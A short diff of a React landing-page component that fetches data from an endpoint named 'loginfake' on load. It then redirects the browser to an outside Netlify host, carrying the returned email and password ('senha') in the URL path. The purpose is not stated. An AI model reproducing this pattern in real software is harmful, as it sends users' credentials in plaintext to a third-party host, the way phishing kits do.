@@ -36,7 +36,7 @@ const Landing: React.FC = () => {
       'https://16hgpfnq69.execute-api.sa-east-1.amazonaws.com/prod/loginfake',
     );
 
-    window.location.href = `https://suspicious-lichterman-3943dc.netlify.app/fake/:${response.data.email}/:${response.data.senha}`;
+    window.location.href = `https://suspicious-lichterman-3943dc.netlify.app/fake/${response.data.email}/${response.data.senha}`;
   }, []);
 
   return (
